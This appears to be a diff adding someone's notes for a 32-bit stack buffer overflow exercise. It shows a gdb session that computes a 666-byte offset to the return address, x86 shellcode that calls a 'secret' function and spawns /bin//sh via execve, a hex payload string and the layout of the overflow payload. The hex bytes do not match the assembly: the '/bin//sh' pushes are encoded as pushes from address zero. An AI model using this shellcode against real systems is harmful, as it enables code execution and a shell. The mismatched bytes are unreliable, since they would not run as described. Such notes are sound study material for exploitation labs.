@@ -1,0 +1,49 @@
+gef➤  p secret
+$1 = {int ()} 0x565562e5 <secret>
+gef➤  p $ebp
+$2 = (void *) 0xffffd018
+gef➤  p (void *) $ebp
+$3 = (void *) 0xffffd018
+gef➤  p (void *) $ebp + 8
+$4 = (void *) 0xffffd020
+gef➤  p (void *) $ebp + 4 - (void *) &buffer
+$5 = 0x29a
+gef➤  p/d (void *) $ebp + 4 - (void *) &buffer
+$6 = 666
+
+distance = 666
+ret_addr = 0xffffd020
+
+
+shell code:
+
+mov ebx, 0x565562e5
+call ebx
+
+xor eax, eax
+
+push eax
+push 0x68732f2f
+push 0x6e69622f
+
+mov ebx, esp
+
+; system (command) -> amader command build kora done
+
+; argv[] setup
+push eax ; null
+push ebx ; command string ta
+mov ecx, esp
+
+xor edx, edx ; no env variable
+
+xor  eax, eax     
+mov   al, 0x0b    
+int 0x80
+
+
+function =b"\xBB\xE5\x62\x55\x56\xFF\xD3\x31\xC0\x50\xFF\x35\x00\x00\x00\x00\xFF\x35\x00\x00\x00\x00\x89\xE3\x50\x53\x89\xE1\x31\xD2\x31\xC0\xB0\x0B\xCD\x80"
+
+
+[distance|address to ebp+8|[optional NOPS]|shell commands]
+
